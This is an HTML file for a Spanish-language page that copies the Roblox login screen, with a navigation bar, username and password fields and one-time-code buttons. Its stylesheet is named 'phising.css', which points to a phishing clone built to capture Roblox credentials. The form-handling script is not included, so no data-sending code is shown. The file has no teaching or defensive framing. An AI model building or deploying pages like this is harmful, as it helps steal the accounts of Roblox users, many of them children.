<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="phising.css">
    <link rel="https://cdn.rawgit.com/mfd/f3d96ec7f0e8f034cc22ea73b3797b59/raw/856f1dbb8d807aabceb80b6d4f94b464df461b3e/gotham.css">
</head>
<body>
    <nav class="menu">
        <div id="icon">
            <div id="icon-nav-header">
                <a href="#" class="navbar-link">
                    <img src="oldroblox.png" alt="">
                </a>
            </div>
        </div>
        <div id="c-text-menu">
            <ul id="text-menu">
                <li class="list" id="list1">Destacadas</li>
                <li class="list" id="list2">Mercado</li>
                <li class="list" id="list3">Crear</li>
                <li class="list" id="list4">Robux</li>
            </ul>
        </div>
        <div id="navegacion">         
            <input type="search" id="buscador" placeholder="Buscar">
            <a href="#" id="boton-lupa">
                <img src="luparoblox-removebg-preview.png" alt="" id="lupa">
            </a>
        </div>
        <div id="robloxRI">
            <ul id="links-buttons">
                <li id="links-button1" class="links-li">
                    <a href="#" id="a1" class="as">Registro</a>
                </li>
                <li id="links-button2" class="links-li">
                    <a href="#" id="a2" class="as">Iniciar sesión</a>
                </li>
            </ul>
        </div>
    </nav>
    <div id="container">    
        <form action="" id="in">
            <h1>Iniciar sesión en Roblox</h1>
            <div id="inputs">
                <input type="text" id="input1" placeholder="Usuario/correo/teléfono">
                <input type="password" id="input2" placeholder="Contraseña">
                <button id="ins">Iniciar sesión</button>
            </div>
            <div id="texto">
                <a href="#">¿Olvidaste la contraseña o el nombre de usuario?</a>
            </div>
            <div id="botones">
                <div id="c-linea-divisora">
                    <div id="linea-divisora"></div>
                </div>
                <button id="boton1">Envíame un código de un solo uso</button>
                <button id="boton2">Usar otro dispositivo</button>
            </div>
            <div id="ntcdr">
                    <p>¿No tienes una cuenta de Roblox?</p>
                    <a href="#"><b>Regístrate</b></a>
            </div>
        </form>
    </div>
    <script src="script.js"></script>
</body>
</html>
